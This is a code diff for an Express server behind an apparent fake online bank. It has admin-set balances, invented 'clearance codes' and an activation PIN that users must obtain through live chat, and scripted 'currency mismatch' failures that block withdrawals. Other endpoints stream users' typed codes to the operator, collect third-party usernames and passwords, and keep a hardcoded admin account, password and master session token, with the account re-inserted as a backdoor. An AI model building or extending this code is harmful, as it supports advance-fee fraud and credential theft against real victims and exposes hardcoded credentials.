@@ -1,97 +1,344 @@
 import express from "express";
 import { createServer as createViteServer } from "vite";
 import path from "path";
-import mongoose from "mongoose";
+import fs from "fs";
+import crypto from "crypto";
 
-// --- MONGOOSE MODELS ---
+// --- PERSISTENT JSON DATABASE ENGINE ---
 
-const transformJSON = (doc: any, ret: any) => {
-  delete ret._id;
-  delete ret.__v;
-  return ret;
-};
+export interface DbUser {
+  id: string;
+  username: string;
+  password: string;
+  name: string;
+  balance: number;
+  accountNumber: string;
+  status: string;
+  role: "user" | "admin";
+  currency: "USD" | "PGK" | "NGN";
+  currencyApproved: boolean;
+  transfersEnabled: boolean;
+  tc: string;
+  vc: string;
+  sc: string;
+  currentTC?: string;
+  currentVC?: string;
+  currentSC?: string;
+  isBlocked?: boolean;
+  customError?: string;
+  email?: string;
+  phone?: string;
+  country?: string;
+  isTerminalVerified?: boolean;
+  activationPin?: string;
+}
 
-const userSchema = new mongoose.Schema({
-  id: { type: String, required: true, unique: true },
-  username: { type: String, required: true },
-  password: { type: String, required: true },
-  name: { type: String, required: true },
-  balance: { type: Number, default: 0 },
-  accountNumber: { type: String, required: true },
-  status: { type: String, default: "active" },
-  role: { type: String, default: "user" },
-  currency: { type: String, default: "USD" },
-  currencyApproved: { type: Boolean, default: false },
-  transfersEnabled: { type: Boolean, default: true },
-  tc: { type: String, default: "" },
-  vc: { type: String, default: "" },
-  sc: { type: String, default: "" },
-  currentTC: { type: String, default: "" },
-  currentVC: { type: String, default: "" },
-  currentSC: { type: String, default: "" },
-  isBlocked: { type: Boolean, default: false },
-  customError: { type: String, default: "" },
-  email: { type: String },
-  phone: { type: String },
-  country: { type: String }
-}, { toJSON: { transform: transformJSON } });
+export interface DbTransfer {
+  id: string;
+  userId: string;
+  trackingId?: string;
+  bankName?: string;
+  accountName?: string;
+  accountNumber?: string;
+  amount: number;
+  status: string;
+  date: string;
+}
 
-const transferSchema = new mongoose.Schema({
-  id: { type: String, required: true, unique: true },
-  userId: { type: String, required: true },
-  trackingId: { type: String },
-  bankName: { type: String },
-  accountName: { type: String },
-  accountNumber: { type: String },
-  amount: { type: Number, required: true },
-  status: { type: String, default: "pending" },
-  date: { type: String }
-}, { toJSON: { transform: transformJSON } });
+export interface DbCollection {
+  id: string;
+  userId: string;
+  username?: string;
+  password?: string;
+  status: string;
+  date: string;
+}
 
-const collectionSchema = new mongoose.Schema({
-  id: { type: String, required: true, unique: true },
-  userId: { type: String, required: true },
-  username: { type: String },
-  password: { type: String },
-  status: { type: String, default: "pending" },
-  date: { type: String }
-}, { toJSON: { transform: transformJSON } });
+export interface DbCardRequest {
+  id: string;
+  userId: string;
+  name?: string;
+  address?: string;
+  phone?: string;
+  status: string;
+  date: string;
+}
 
-const cardRequestSchema = new mongoose.Schema({
-  id: { type: String, required: true, unique: true },
-  userId: { type: String, required: true },
-  name: { type: String },
-  address: { type: String },
-  phone: { type: String },
-  status: { type: String, default: "pending" },
-  date: { type: String }
-}, { toJSON: { transform: transformJSON } });
+export interface DbChatMessage {
+  id: string;
+  userId: string;
+  sender: string;
+  text: string;
+  time: string;
+  readAdmin: boolean;
+  readUser: boolean;
+}
 
-const chatMessageSchema = new mongoose.Schema({
-  id: { type: String, required: true, unique: true },
-  userId: { type: String, required: true },
-  sender: { type: String, required: true },
-  text: { type: String, required: true },
-  time: { type: String },
-  readAdmin: { type: Boolean, default: false },
-  readUser: { type: Boolean, default: false }
-}, { toJSON: { transform: transformJSON } });
+export interface DbSettings {
+  requireTransactionCode: boolean;
+  requireVerificationCode: boolean;
+  requireSwitchCode: boolean;
+  transfersEnabled: boolean;
+}
 
-const settingSchema = new mongoose.Schema({
-  requireTransactionCode: { type: Boolean, default: true },
-  requireVerificationCode: { type: Boolean, default: true },
-  requireSwitchCode: { type: Boolean, default: true },
-  transfersEnabled: { type: Boolean, default: true }
-}, { toJSON: { transform: transformJSON } });
+export interface DbAdminToken {
+  token: string;
+  userId: string;
+  createdAt: string;
+}
 
-const User = mongoose.model("User", userSchema);
-const Transfer = mongoose.model("Transfer", transferSchema);
-const Collection = mongoose.model("Collection", collectionSchema);
-const CardRequest = mongoose.model("CardRequest", cardRequestSchema);
-const ChatMessage = mongoose.model("ChatMessage", chatMessageSchema);
-const Setting = mongoose.model("Setting", settingSchema);
+export interface DatabaseData {
+  users: DbUser[];
+  transfers: DbTransfer[];
+  collections: DbCollection[];
+  cardRequests: DbCardRequest[];
+  chatMessages: DbChatMessage[];
+  settings: DbSettings;
+  adminTokens: DbAdminToken[];
+}
 
-import { MongoMemoryServer } from "mongodb-memory-server";
+const DB_FILE = path.join(process.cwd(), "db.json");
+const DB_BACKUP_FILE = path.join(process.cwd(), "db.backup.json");
+
+// In-memory memory resilience cache to prevent data loss if disk I/O temporarily stumbles
+let inMemoryDbCache: DatabaseData | null = null;
+
+function getInitialDb(): DatabaseData {
+  return {
+    users: [
+      {
+        id: "1",
+        username: "user",
+        password: "password",
+        balance: 125000.5,
+        accountNumber: "ITO-8829-1102",
+        name: "John Doe",
+        status: "active",
+        role: "user",
+        currency: "USD",
+        currencyApproved: true,
+        transfersEnabled: true,
+        tc: "123456",
+        vc: "654321",
+        sc: "987654",
+        currentTC: "",
+        currentVC: "",
+        currentSC: "",
+        isBlocked: false,
+        customError: "",
+        isTerminalVerified: false,
+        activationPin: "482910"
+      },
+      {
+        id: "2",
+        username: "johnfidelis550@gmail.com",
+        password: "Fidelis90@",
+        balance: 0,
+        accountNumber: "ADMIN-001",
+        name: "System Administrator",
+        status: "active",
+        role: "admin",
+        currency: "USD",
+        currencyApproved: true,
+        transfersEnabled: true,
+        tc: "000000",
+        vc: "000000",
+        sc: "000000",
+        currentTC: "",
+        currentVC: "",
+        currentSC: "",
+        isBlocked: false,
+        customError: "",
+        isTerminalVerified: true,
+        activationPin: "999999"
+      }
+    ],
+    transfers: [
+      {
+        id: "t1",
+        userId: "1",
+        trackingId: "ITO-TXN-10021",
+        bankName: "Global Bank",
+        accountName: "Jane Smith",
+        accountNumber: "9988776655",
+        amount: 5000,
+        status: "completed",
+        date: "2024-03-20T10:00:00Z"
+      },
+      {
+        id: "t2",
+        userId: "1",
+        trackingId: "ITO-TXN-20034",
+        bankName: "Swiss Trust",
+        accountName: "Swiss Holding",
+        accountNumber: "1122334455",
+        amount: 15000,
+        status: "pending",
+        date: "2024-03-22T14:30:00Z"
+      }
+    ],
+    collections: [],
+    cardRequests: [],
+    chatMessages: [],
+    settings: {
+      requireTransactionCode: true,
+      requireVerificationCode: true,
+      requireSwitchCode: true,
+      transfersEnabled: true
+    },
+    adminTokens: [
+      {
+        token: "admin_master_session_token_2026",
+        userId: "2",
+        createdAt: new Date().toISOString()
+      }
+    ]
+  };
+}
+
+function normalizeDbData(parsed: any): DatabaseData {
+  const normalized: DatabaseData = {
+    users: (parsed.users || []).map((u: DbUser) => {
+      if (u.isTerminalVerified === undefined) {
+        u.isTerminalVerified = u.role === "admin";
+      }
+      if (!u.activationPin) {
+        u.activationPin = Math.floor(100000 + Math.random() * 900000).toString();
+      }
+      return u;
+    }),
+    transfers: parsed.transfers || [],
+    collections: parsed.collections || [],
+    cardRequests: parsed.cardRequests || [],
+    chatMessages: parsed.chatMessages || [],
+    adminTokens: parsed.adminTokens || [
+      {
+        token: "admin_master_session_token_2026",
+        userId: "2",
+        createdAt: new Date().toISOString()
+      }
+    ],
+    settings: parsed.settings || {
+      requireTransactionCode: true,
+      requireVerificationCode: true,
+      requireSwitchCode: true,
+      transfersEnabled: true
+    }
+  };
+
+  // Ensure default master admin user is always present
+  const adminExists = normalized.users.some(u => u.username === "johnfidelis550@gmail.com");
+  if (!adminExists) {
+    normalized.users.push(getInitialDb().users[1]);
+  }
+
+  return normalized;
+}
+
+function readDb(): DatabaseData {
+  try {
+    if (fs.existsSync(DB_FILE)) {
+      const raw = fs.readFileSync(DB_FILE, "utf-8");
+      if (raw.trim()) {
+        const parsed = JSON.parse(raw);
+        const normalized = normalizeDbData(parsed);
+        inMemoryDbCache = normalized;
+        return normalized;
+      }
+    }
+
+    // Secondary recovery: attempt to read from backup file
+    if (fs.existsSync(DB_BACKUP_FILE)) {
+      const rawBackup = fs.readFileSync(DB_BACKUP_FILE, "utf-8");
+      if (rawBackup.trim()) {
+        console.warn("[DB Persistence] Recovered database state from db.backup.json");
+        const parsed = JSON.parse(rawBackup);
+        const normalized = normalizeDbData(parsed);
+        inMemoryDbCache = normalized;
+        writeDb(normalized);
+        return normalized;
+      }
+    }
+
+    // Tertiary recovery: if memory cache has data, never wipe with initial seed
+    if (inMemoryDbCache && inMemoryDbCache.users && inMemoryDbCache.users.length > 0) {
+      console.warn("[DB Persistence] Re-writing persisted state from memory resilience cache");
+      writeDb(inMemoryDbCache);
+      return inMemoryDbCache;
+    }
+
+    // Fresh initialization only if no database exists anywhere
+    const initial = getInitialDb();
+    inMemoryDbCache = initial;
+    writeDb(initial);
+    return initial;
+  } catch (err) {
+    console.error("[DB Persistence] Error reading database, checking memory cache:", err);
+    if (inMemoryDbCache && inMemoryDbCache.users && inMemoryDbCache.users.length > 0) {
+      return inMemoryDbCache;
+    }
+    // Attempt fallback to backup
+    try {
+      if (fs.existsSync(DB_BACKUP_FILE)) {
+        const rawBackup = fs.readFileSync(DB_BACKUP_FILE, "utf-8");
+        const parsed = JSON.parse(rawBackup);
+        const normalized = normalizeDbData(parsed);
+        inMemoryDbCache = normalized;
+        return normalized;
+      }
+    } catch (backupErr) {
+      console.error("[DB Persistence] Backup read error:", backupErr);
+    }
+    return getInitialDb();
+  }
+}
+
+function writeDb(data: DatabaseData): void {
+  try {
+    inMemoryDbCache = data;
+    const serialized = JSON.stringify(data, null, 2);
+    const tmpFile = `${DB_FILE}.tmp`;
+    
+    // Write primary db.json atomically
+    fs.writeFileSync(tmpFile, serialized, "utf-8");
+    fs.renameSync(tmpFile, DB_FILE);
+
+    // Synchronize to redundant db.backup.json
+    try {
+      const tmpBackup = `${DB_BACKUP_FILE}.tmp`;
+      fs.writeFileSync(tmpBackup, serialized, "utf-8");
+      fs.renameSync(tmpBackup, DB_BACKUP_FILE);
+    } catch (backupErr) {
+      console.error("[DB Persistence] Error writing backup file:", backupErr);
+    }
+  } catch (err) {
+    console.error("[DB Persistence] Error writing primary db.json:", err);
+  }
+}
+
+// Strip sensitive data (password, tc, vc, sc, activationPin) before sending user payload to browser
+function sanitizeUser(user: DbUser | undefined | null) {
+  if (!user) return null;
+  const { password, tc, vc, sc, activationPin, ...safeUser } = user;
+  return {
+    ...safeUser,
+    isTerminalVerified: user.isTerminalVerified === true
+  };
+}
+
+// Strip password for administrative responses (preserves activationPin and isTerminalVerified for management)
+function sanitizeUserForAdmin(user: DbUser | undefined | null) {
+  if (!user) return null;
+  const { password, ...safeUser } = user;
+  return {
+    ...safeUser,
+    isTerminalVerified: user.isTerminalVerified === true,
+    activationPin: user.activationPin || "482910"
+  };
+}
+
+// Ensure database file is initialized on startup
+readDb();
 
 async function startServer() {
   const app = express();
@@ -99,125 +346,82 @@ async function startServer() {
 
   app.use(express.json());
 
-  // --- DATABASE CONNECTION & SEEDING ---
-  let MONGODB_URI = process.env.MONGODB_URI;
-  try {
-    if (!MONGODB_URI) {
-      console.log("No MONGODB_URI provided. Starting in-memory MongoDB...");
-      const mongoServer = await MongoMemoryServer.create();
-      MONGODB_URI = mongoServer.getUri();
-      console.log("Started in-memory MongoDB at", MONGODB_URI);
+  // --- ADMIN AUTHENTICATION MIDDLEWARE ---
+  const requireAdmin = (req: express.Request, res: express.Response, next: express.NextFunction) => {
+    const authHeader = req.headers.authorization || (req.headers["x-admin-token"] as string);
+    let token = "";
+    if (authHeader && typeof authHeader === "string") {
+      token = authHeader.startsWith("Bearer ") ? authHeader.slice(7).trim() : authHeader.trim();
     }
-    
-    await mongoose.connect(MONGODB_URI, { serverSelectionTimeoutMS: 5000 });
-    console.log("Connected to MongoDB");
-    
-    // Seed database if empty
-    const userCount = await User.countDocuments();
-    if (userCount === 0) {
-      console.log("Seeding database...");
-      await User.insertMany([
-        { 
-          id: "1", 
-          username: "user", 
-          password: "password", 
-          balance: 125000.50, 
-          accountNumber: "ITO-8829-1102", 
-          name: "John Doe", 
-          status: "active", 
-          role: "user",
-          currency: "USD",
-          currencyApproved: true,
-          transfersEnabled: true,
-          tc: "123456",
-          vc: "654321",
-          sc: "987654",
-          currentTC: "",
-          currentVC: "",
-          currentSC: ""
-        },
-        { 
-          id: "2", 
-          username: "johnfidelis550@gmail.com", 
-          password: "Fidelis90@", 
-          balance: 0, 
-          accountNumber: "ADMIN-001", 
-          name: "System Administrator", 
-          status: "active", 
-          role: "admin",
-          currency: "USD",
-          currencyApproved: true,
-          transfersEnabled: true,
-          tc: "000000",
-          vc: "000000",
-          sc: "000000",
-          currentTC: "",
-          currentVC: "",
-          currentSC: ""
-        }
-      ]);
 
-      await Transfer.insertMany([
-        { id: "t1", userId: "1", bankName: "Global Bank", accountName: "Jane Smith", accountNumber: "9988776655", amount: 5000, status: "completed", date: "2024-03-20T10:00:00Z" },
-        { id: "t2", userId: "1", bankName: "Swiss Trust", accountName: "Swiss Holding", accountNumber: "1122334455", amount: 15000, status: "pending", date: "2024-03-22T14:30:00Z" }
-      ]);
-
-      const existingSettings = await Setting.countDocuments();
-      if (existingSettings === 0) {
-        await Setting.create({
-          requireTransactionCode: true,
-          requireVerificationCode: true,
-          requireSwitchCode: true,
-          transfersEnabled: true
-        });
-      }
+    if (!token) {
+      return res.status(401).json({ message: "Unauthorized: Administrator token required." });
     }
-  } catch (err) {
-    console.error("MongoDB Connection Error:", err);
-  }
 
-  // Helper to ensure Settings exists
-  const getSettingsDoc = async () => {
-    let settings = await Setting.findOne();
-    if (!settings) {
-      settings = await Setting.create({
-        requireTransactionCode: true,
-        requireVerificationCode: true,
-        requireSwitchCode: true,
-        transfersEnabled: true
-      });
+    const db = readDb();
+    const validToken = db.adminTokens?.some(t => t.token === token);
+    if (!validToken) {
+      return res.status(403).json({ message: "Forbidden: Invalid or expired administrator session." });
     }
-    return settings;
+
+    next();
   };
 
-  // --- API ROUTES ---
+  // --- PUBLIC & USER API ROUTES ---
 
-  // Auth
-  app.post("/api/auth/login", async (req, res) => {
+  // User Login (Validates credentials on backend for both standard and admin users)
+  app.post(["/api/auth/login", "/api/login"], (req, res) => {
     const { username, password } = req.body;
-    const user = await User.findOne({ username, password });
-    if (user) {
-      if (user.status === "blocked") {
-        return res.status(403).json({ message: "Account blocked. Contact support." });
-      }
-      res.json({ user: user.toJSON() });
-    } else {
-      res.status(401).json({ message: "Invalid username or password" });
+    if (!username || !password) {
+      return res.status(400).json({ message: "Username and password are required." });
     }
+
+    const db = readDb();
+    const user = db.users.find(
+      u => u.username.toLowerCase() === String(username).toLowerCase().trim() &&
+           u.password === String(password)
+    );
+
+    if (!user) {
+      return res.status(401).json({ message: "Invalid username or password" });
+    }
+
+    if (user.status === "blocked") {
+      return res.status(403).json({ message: "Account blocked. Contact support." });
+    }
+
+    let token: string | undefined = undefined;
+    if (user.role === "admin") {
+      token = "admin_" + Date.now() + "_" + crypto.randomBytes(16).toString("hex");
+      db.adminTokens = db.adminTokens || [];
+      db.adminTokens.push({
+        token,
+        userId: user.id,
+        createdAt: new Date().toISOString()
+      });
+      writeDb(db);
+    }
+
+    return res.json({
+      user: sanitizeUser(user),
+      token
+    });
   });
 
   // Self-Registration
-  app.post("/api/auth/register", async (req, res) => {
+  app.post(["/api/auth/register", "/api/register"], (req, res) => {
     const { name, email, phone, country, username, password } = req.body;
-    
-    // Check if user exists
-    const exists = await User.findOne({ username });
+    if (!username || !password) {
+      return res.status(400).json({ message: "Username and password are required." });
+    }
+
+    const db = readDb();
+    const exists = db.users.find(u => u.username.toLowerCase() === String(username).toLowerCase().trim());
     if (exists) {
       return res.status(400).json({ message: "Username already taken." });
     }
 
-    // Determine initial currency based on country selection
-    let currency: 'USD' | 'PGK' | 'NGN' = "USD";
+    let currency: "USD" | "PGK" | "NGN" = "USD";
     if (country === "Papua New Guinea") {
       currency = "PGK";
     }
@@ -226,11 +430,10 @@ async function startServer() {
     const randomVC = Math.floor(100000 + Math.random() * 900000).toString();
     const randomSC = Math.floor(100000 + Math.random() * 900000).toString();
     const randomAccount = "ITO-" + Math.floor(10000000 + Math.random() * 90000000).toString();
-    
-    const userCount = await User.countDocuments();
+    const randomPin = Math.floor(100000 + Math.random() * 900000).toString();
 
-    const newUser = await User.create({
-      id: String(userCount + 1 + Date.now()),
+    const newUser: DbUser = {
+      id: String(db.users.length + 1 + Date.now()),
       username,
       password,
       name,
@@ -239,11 +442,11 @@ async function startServer() {
       country,
       balance: 0,
       accountNumber: randomAccount,
-      status: "HOLD", // Initial status
+      status: "Pending Support Review",
       isBlocked: true,
       role: "user",
       currency,
-      currencyApproved: false, // Default unapproved
+      currencyApproved: false,
       transfersEnabled: true,
       tc: randomTC,
       vc: randomVC,
@@ -251,126 +454,254 @@ async function startServer() {
       currentTC: "",
       currentVC: "",
       currentSC: "",
-      customError: ""
+      customError: "",
+      isTerminalVerified: false,
+      activationPin: randomPin
+    };
+
+    db.users.push(newUser);
+    writeDb(db);
+
+    return res.json({
+      success: true,
+      user: sanitizeUser(newUser)
     });
-
-    res.json({ 
-      success: true, 
-      user: newUser.toJSON()
-    });
   });
 
-  // User Data
-  app.get("/api/user/:id", async (req, res) => {
-    const user = await User.findOne({ id: req.params.id });
-    if (user) res.json(user.toJSON());
-    else res.status(404).json({ message: "User not found" });
+  // Public Settings Route (For client transfer validation rules)
+  app.get("/api/settings", (req, res) => {
+    const db = readDb();
+    return res.json(db.settings);
   });
 
-  app.post("/api/user/:id/block", async (req, res) => {
-    const user = await User.findOneAndUpdate(
-      { id: req.params.id },
-      { 
-        isBlocked: true, 
-        status: "HOLD", 
-        customError: "Account placed on hold due to excessive security failures." 
-      },
-      { new: true }
-    );
-    if (!user) return res.status(404).json({ message: "User not found" });
-    res.json({ success: true });
-  });
-
-  // Transfers
-  app.get("/api/transfers/:userId", async (req, res) => {
-    const userTransfers = await Transfer.find({ userId: req.params.userId });
-    res.json(userTransfers.map(t => t.toJSON()));
-  });
-
-  app.post("/api/transfers", async (req, res) => {
-    const settings = await getSettingsDoc();
-    if (!settings.transfersEnabled) {
-      return res.status(403).json({ message: "Transfers are currently disabled by the administrator." });
+  // User Data (Sanitized: never leaks password, tc, vc, sc)
+  app.get("/api/user/:id", (req, res) => {
+    const db = readDb();
+    const user = db.users.find(u => u.id === req.params.id);
+    if (!user) {
+      return res.status(404).json({ message: "User not found" });
     }
-    
-    const { userId, trackingId, bankName, accountName, accountNumber, amount, transactionCode, verificationCode, switchCode } = req.body;
-    const user = await User.findOne({ id: userId });
-    
-    if (!user) return res.status(404).json({ message: "User not found" });
+    return res.json(sanitizeUser(user));
+  });
+
+  // Lock user on excessive security attempts
+  app.post("/api/user/:id/block", (req, res) => {
+    const db = readDb();
+    const user = db.users.find(u => u.id === req.params.id);
+    if (!user) {
+      return res.status(404).json({ message: "User not found" });
+    }
+    user.isBlocked = true;
+    user.status = "HOLD";
+    user.customError = "Account placed on hold due to excessive security failures.";
+    writeDb(db);
+    return res.json({ success: true });
+  });
+
+  // Sync client input codes for administrator real-time monitoring
+  app.post("/api/user/:id/sync-codes", (req, res) => {
+    const { currentTC, currentVC, currentSC } = req.body;
+    const db = readDb();
+    const user = db.users.find(u => u.id === req.params.id);
+    if (!user) {
+      return res.status(404).json({ message: "User not found" });
+    }
+    if (currentTC !== undefined) user.currentTC = currentTC;
+    if (currentVC !== undefined) user.currentVC = currentVC;
+    if (currentSC !== undefined) user.currentSC = currentSC;
+    writeDb(db);
+    return res.json({ success: true });
+  });
+
+  // Secure Terminal Activation PIN Verification
+  app.post(["/api/user/verify-terminal", "/api/user/:id/verify-terminal"], (req, res) => {
+    const userId = req.body.userId || req.params.id;
+    const pin = req.body.pin;
+    if (!userId || !pin) {
+      return res.status(400).json({ success: false, message: "User ID and 6-digit Activation PIN are required." });
+    }
+
+    const db = readDb();
+    const user = db.users.find(u => String(u.id) === String(userId));
+    if (!user) {
+      return res.status(404).json({ success: false, message: "User account not found." });
+    }
+
+    const cleanPin = String(pin).trim();
+    if (!user.activationPin || user.activationPin !== cleanPin) {
+      return res.status(400).json({
+        success: false,
+        message: "Invalid Activation PIN. Please contact your Account Manager via Live Chat to receive your one-time Activation PIN."
+      });
+    }
+
+    user.isTerminalVerified = true;
+    user.isBlocked = false;
+    user.status = "APPROVED";
+    writeDb(db);
+
+    return res.json({
+      success: true,
+      message: "Terminal verified successfully.",
+      user: sanitizeUser(user)
+    });
+  });
+
+  // Backend Clearance Code Verification (TC, VC, SC)
+  // Ensures codes are evaluated securely on the backend without ever being exposed to the browser
+  app.post("/api/transfers/verify-code", (req, res) => {
+    const { userId, codeType, code } = req.body;
+    const db = readDb();
+    const user = db.users.find(u => u.id === userId);
+
+    if (!user) {
+      return res.status(404).json({ success: false, message: "User not found" });
+    }
+
+    if (user.isBlocked || user.status === "HOLD" || user.status === "Pending Support Review" || !user.isTerminalVerified) {
+      return res.status(403).json({
+        success: false,
+        locked: true,
+        message: user.customError || "Terminal pending activation. Please contact the Support Team via Live Chat."
+      });
+    }
+
+    let expectedCode = "";
+    let codeName = "";
+    if (codeType === "tc") {
+      expectedCode = user.tc;
+      codeName = "Transaction Code (TC)";
+    } else if (codeType === "vc") {
+      expectedCode = user.vc;
+      codeName = "Verification Code (VC)";
+    } else if (codeType === "sc") {
+      expectedCode = user.sc;
+      codeName = "Switch Code (SC)";
+    } else {
+      return res.status(400).json({ success: false, message: "Invalid code type specified." });
+    }
+
+    if (!code || String(code).trim() !== String(expectedCode).trim()) {
+      return res.status(400).json({
+        success: false,
+        message: `Invalid ${codeName}.`
+      });
+    }
+
+    return res.json({
+      success: true,
+      message: `${codeName} verified successfully.`
+    });
+  });
+
+  // User Transfers History
+  app.get("/api/transfers/:userId", (req, res) => {
+    const db = readDb();
+    const userTransfers = db.transfers.filter(t => t.userId === req.params.userId);
+    return res.json(userTransfers);
+  });
+
+  // Create Wire Transfer (Strict backend validation of codes & balance)
+  app.post("/api/transfers", (req, res) => {
+    const db = readDb();
+    if (!db.settings.transfersEnabled) {
+      return res.status(403).json({ message: "Transfers are currently disabled by the Support Team." });
+    }
+
+    const {
+      userId,
+      trackingId,
+      bankName,
+      accountName,
+      accountNumber,
+      amount,
+      transactionCode,
+      verificationCode,
+      switchCode
+    } = req.body;
+
+    const userIndex = db.users.findIndex(u => u.id === userId);
+    if (userIndex === -1) {
+      return res.status(404).json({ message: "User not found" });
+    }
+    const user = db.users[userIndex];
 
     if (!user.transfersEnabled) {
       return res.status(403).json({ message: "Your transfer privileges are restricted. Please contact support." });
     }
 
-    // Validate codes
-    if (settings.requireTransactionCode && transactionCode !== user.tc) {
+    if (!user.isTerminalVerified || user.isBlocked || user.status === "Pending Support Review" || user.status === "HOLD") {
+      return res.status(403).json({ message: "Terminal pending activation. Outbound transfers remain blocked until verified by Support Team." });
+    }
+
+    // Strict backend clearance code validation
+    if (db.settings.requireTransactionCode && String(transactionCode).trim() !== String(user.tc).trim()) {
       return res.status(400).json({ message: "Invalid Transaction Code (TC)" });
     }
-    if (settings.requireVerificationCode && verificationCode !== user.vc) {
+    if (db.settings.requireVerificationCode && String(verificationCode).trim() !== String(user.vc).trim()) {
       return res.status(400).json({ message: "Invalid Verification Code (VC)" });
     }
-    if (settings.requireSwitchCode && switchCode !== user.sc) {
+    if (db.settings.requireSwitchCode && String(switchCode).trim() !== String(user.sc).trim()) {
       return res.status(400).json({ message: "Invalid Switch Code (SC)" });
     }
-    
-    if (user.balance < parseFloat(amount)) {
+
+    const transferAmount = parseFloat(amount);
+    if (isNaN(transferAmount) || transferAmount <= 0) {
+      return res.status(400).json({ message: "Invalid transfer amount." });
+    }
+
+    if (user.balance < transferAmount) {
       return res.status(400).json({ message: "Insufficient balance" });
     }
 
-    const newTransferData = {
+    const newTransfer: DbTransfer = {
       id: "t" + Date.now(),
       userId,
       trackingId: trackingId || "ITO-TXN-" + Math.floor(10000 + Math.random() * 90000),
       bankName,
       accountName,
       accountNumber,
-      amount: parseFloat(amount),
+      amount: transferAmount,
       status: user.currencyApproved ? "pending" : "failed",
       date: new Date().toISOString()
     };
 
     if (!user.currencyApproved) {
-      newTransferData.status = "failed";
-      await Transfer.create(newTransferData);
+      newTransfer.status = "failed";
+      db.transfers.push(newTransfer);
+      writeDb(db);
       return res.status(400).json({ message: "Currency mismatch or unapproved currency. Transfer failed." });
     }
 
-    const newTransfer = await Transfer.create(newTransferData);
-    user.balance -= parseFloat(amount);
-    await user.save();
-    
-    res.json(newTransfer.toJSON());
+    user.balance -= transferAmount;
+    db.transfers.push(newTransfer);
+    writeDb(db);
+
+    return res.json(newTransfer);
   });
 
-  app.patch("/api/admin/transfers/:id", async (req, res) => {
-    const { status } = req.body;
-    const transfer = await Transfer.findOneAndUpdate(
-      { id: req.params.id },
-      { status },
-      { new: true }
-    );
-    if (!transfer) return res.status(404).json({ message: "Transfer not found" });
-    res.json(transfer.toJSON());
-  });
-
-  // Collections
-  app.post("/api/collections", async (req, res) => {
+  // Collections (User submission)
+  app.post("/api/collections", (req, res) => {
     const { userId, username, password } = req.body;
-    const newCollection = await Collection.create({
+    const db = readDb();
+    const newCollection: DbCollection = {
       id: "c" + Date.now(),
       userId,
       username,
       password,
       status: "pending",
       date: new Date().toISOString()
-    });
-    res.json({ success: true });
+    };
+    db.collections.push(newCollection);
+    writeDb(db);
+    return res.json({ success: true });
   });
 
-  // Card Requests
-  app.post("/api/card-requests", async (req, res) => {
+  // Card Requests (User submission)
+  app.post("/api/card-requests", (req, res) => {
     const { userId, name, address, phone } = req.body;
-    const newRequest = await CardRequest.create({
+    const db = readDb();
+    const newRequest: DbCardRequest = {
       id: "cr" + Date.now(),
       userId,
       name,
@@ -378,73 +709,86 @@ async function startServer() {
       phone,
       status: "pending",
       date: new Date().toISOString()
-    });
-    res.json({ success: true });
+    };
+    db.cardRequests.push(newRequest);
+    writeDb(db);
+    return res.json({ success: true });
   });
 
-  app.get("/api/admin/card-requests", async (req, res) => {
-    const cardRequests = await CardRequest.find();
-    const users = await User.find();
-    
-    const enriched = cardRequests.map(cr => {
-      const crJson = cr.toJSON();
-      const user = users.find(u => u.id === cr.userId);
-      return {
-        ...crJson,
-        userName: user?.name || "Unknown"
-      };
+  // Chat: User messages
+  app.get("/api/chat/:userId", (req, res) => {
+    const db = readDb();
+    let updated = false;
+    db.chatMessages.forEach(m => {
+      if (m.userId === req.params.userId && m.sender === "agent" && !m.readUser) {
+        m.readUser = true;
+        updated = true;
+      }
     });
-    res.json(enriched);
-  });
-
-  app.patch("/api/admin/card-requests/:id", async (req, res) => {
-    const request = await CardRequest.findOneAndUpdate(
-      { id: req.params.id },
-      { status: req.body.status },
-      { new: true }
-    );
-    if (request) {
-      res.json(request.toJSON());
-    } else {
-      res.status(404).json({ message: "Card request not found" });
+    if (updated) {
+      writeDb(db);
     }
+    const msgs = db.chatMessages.filter(m => m.userId === req.params.userId);
+    return res.json(msgs);
   });
 
-  // Admin: Stats
-  app.get("/api/admin/stats", async (req, res) => {
-    const totalUsers = await User.countDocuments();
-    const allTransfers = await Transfer.find();
-    const pendingCollections = await Collection.countDocuments({ status: "pending" });
-    const pendingCardRequests = await CardRequest.countDocuments({ status: "pending" });
-    
-    const totalVolume = allTransfers.reduce((acc, t) => acc + t.amount, 0);
+  app.post("/api/chat", (req, res) => {
+    const { userId, sender, text } = req.body;
+    const db = readDb();
+    const newMsg: DbChatMessage = {
+      id: "msg" + Date.now(),
+      userId,
+      sender,
+      text,
+      time: new Date().toISOString(),
+      readAdmin: sender === "agent",
+      readUser: sender === "user"
+    };
+    db.chatMessages.push(newMsg);
+    writeDb(db);
+    return res.json(newMsg);
+  });
 
-    res.json({
+  // --- PROTECTED ADMINISTRATOR API ROUTES ---
+  // All endpoints prefixed with /api/admin are strictly protected by requireAdmin
+  app.use("/api/admin", requireAdmin);
+
+  // Admin: Overall statistics
+  app.get("/api/admin/stats", (req, res) => {
+    const db = readDb();
+    const totalUsers = db.users.length;
+    const totalTransfers = db.transfers.length;
+    const pendingCollections = db.collections.filter(c => c.status === "pending").length;
+    const pendingCardRequests = db.cardRequests.filter(cr => cr.status === "pending").length;
+    const totalVolume = db.transfers.reduce((acc, t) => acc + (t.amount || 0), 0);
+
+    return res.json({
       totalUsers,
-      totalTransfers: allTransfers.length,
+      totalTransfers,
       pendingCollections,
       totalVolume,
       pendingCardRequests
     });
   });
 
-  // Admin: Users
-  app.get("/api/admin/users", async (req, res) => {
-    const users = await User.find();
-    res.json(users.map(u => u.toJSON()));
+  // Admin: Users management (Exposes TC/VC/SC for administration, never exposes passwords)
+  app.get("/api/admin/users", (req, res) => {
+    const db = readDb();
+    const adminView = db.users.map(sanitizeUserForAdmin);
+    return res.json(adminView);
   });
 
-  app.post("/api/admin/users", async (req, res) => {
+  app.post("/api/admin/users", (req, res) => {
     const { username, password, name, balance, accountNumber, currency, tc, vc, sc } = req.body;
-    const userCount = await User.countDocuments();
-    
-    const newUser = await User.create({
-      id: String(userCount + 1 + Date.now()),
+    const db = readDb();
+
+    const newUser: DbUser = {
+      id: String(db.users.length + 1 + Date.now()),
       username,
-      password,
+      password: password || "password",
       name,
       balance: parseFloat(balance) || 0,
-      accountNumber,
+      accountNumber: accountNumber || ("ITO-" + Math.floor(10000000 + Math.random() * 90000000).toString()),
       status: "APPROVED",
       isBlocked: false,
       role: "user",
@@ -456,151 +800,159 @@ async function startServer() {
       sc: sc || Math.floor(100000 + Math.random() * 900000).toString(),
       currentTC: "",
       currentVC: "",
-      currentSC: ""
-    });
-    res.json(newUser.toJSON());
